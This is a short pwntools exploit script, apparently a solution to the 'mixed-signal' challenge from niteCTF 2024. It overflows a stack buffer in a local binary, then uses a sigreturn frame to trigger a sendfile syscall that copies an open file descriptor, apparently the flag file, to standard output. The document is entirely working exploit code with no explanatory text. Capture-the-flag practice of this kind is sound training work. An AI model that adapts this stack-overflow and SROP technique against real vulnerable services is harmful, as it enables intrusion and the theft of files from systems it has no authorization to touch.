from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chal'
elf = ELF(PROG)

### ------------------ EXPLOIT ------------------ ###

r = process(PROG)
# r = remote('mixed-signal.chals.nitectf2024.live', 1337, ssl=True)

syscall_ret = 0x40119a

pay = b'a' * (8*2)
pay += p64(elf.plt['read'])
pay += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0x28
frame.rdi = 1
# On remote, there are other open files (sockets)
frame.rsi = 5
# frame.rsi = 3
frame.rdx = 0
frame.r10 = 0x100
frame.rip = syscall_ret
frame.rsp = elf.sym['data_start']

pay += bytes(frame)

r.sendlineafter(b'pickup!', pay)

r.send(b'b' * 0xf)

r.interactive()